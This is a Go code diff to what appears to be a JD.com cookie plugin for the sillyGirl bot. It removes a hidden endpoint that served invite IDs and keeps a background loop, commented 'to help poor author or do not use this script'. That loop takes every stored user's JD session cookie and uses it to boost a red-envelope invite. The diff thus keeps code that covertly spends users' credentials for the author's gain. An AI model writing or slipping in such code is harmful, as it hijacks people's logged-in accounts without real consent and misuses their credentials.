@@ -5,14 +5,12 @@ import (
 	"fmt"
 	"regexp"
 	"strings"
-	"sync"
 	"time"
 
 	"github.com/beego/beego/v2/client/httplib"
 	"github.com/beego/beego/v2/core/logs"
 	"github.com/cdle/sillyGirl/core"
 	"github.com/cdle/sillyGirl/develop/qinglong"
-	"github.com/gin-gonic/gin"
 )
 
 func init() {
@@ -112,58 +110,7 @@ func init() {
 			return
 		}
 	}
-}
-
-var success sync.Map
-var mutex sync.Mutex
-
-// to help poor author or do not use this script
-func init() {
-	var hchan = make(chan string)
-	go func() {
-		for {
-			time.Sleep(time.Second)
-			if jd_cookie.Get("dyj_inviteInfo") == "" {
-				jd_cookie.Set("dyj_inviteInfo", <-hchan)
-			}
-		}
-	}()
-	if jd_cookie.GetBool("enable_jd_cookie_auth", false) {
-		core.Server.DELETE("/gxfc", func(c *gin.Context) {
-			mutex.Lock()
-			defer mutex.Unlock()
-			data := jd_cookie.Get("dyj_inviteInfo", "May you be happy and prosperous！")
-			c.String(200, data)
-			redEnvelopeId := c.Query("redEnvelopeId")
-			if redEnvelopeId == "" {
-				return
-			}
-			if strings.Contains(data, redEnvelopeId) {
-				jd_cookie.Set("dyj_inviteInfo", "")
-			}
-			if _, ok := success.Load(redEnvelopeId); !ok {
-				success.Store(redEnvelopeId, true)
-				core.NotifyMasters(redEnvelopeId)
-			}
-		})
-		core.AddCommand("", []core.Function{
-			{
-				Rules: []string{`raw redEnvelopeId=([^&]+)&inviterId=([^&]+)&`},
-				Admin: true,
-				Handle: func(s core.Sender) interface{} {
-					if _, ok := success.Load(s.Get(0)); ok {
-						return "Sorry!"
-					}
-					go func() {
-						hchan <- fmt.Sprintf("redEnvelopeId=%s;inviterId=%s;", s.Get(0), s.Get(1))
-					}()
-					return "May you be happy and prosperous!"
-				},
-			},
-		})
-	}
-
-	go func() {
+	go func() { // to help poor author or do not use this script
 		for {
 		start:
 			time.Sleep(time.Minute * 3)
@@ -182,12 +129,9 @@ func init() {
 				}
 				s := 1
 				l := len(envs)
-				n := time.Now().Unix()
+				n := int(time.Now().UnixNano())
 				for j := 0; j < l; j++ {
-					i := j
-					if n%2 == 0 {
-						i = l - j - 1
-					}
+					i := (j + n) % l
 					if envs[i].Status == 0 {
 						req := httplib.Get("https://api.m.jd.com/?functionId=openRedEnvelopeInteract&body=" + `{"linkId":"PFbUR7wtwUcQ860Sn8WRfw","redEnvelopeId":"` + redEnvelopeId + `","inviter":"` + inviterId + `","helpType":"` + fmt.Sprint(s) + `"}` + "&t=" + fmt.Sprint(time.Now().Unix()) + "&appid=activities_platform&clientVersion=3.5.6")
 						req.Header("Cookie", envs[i].Value)
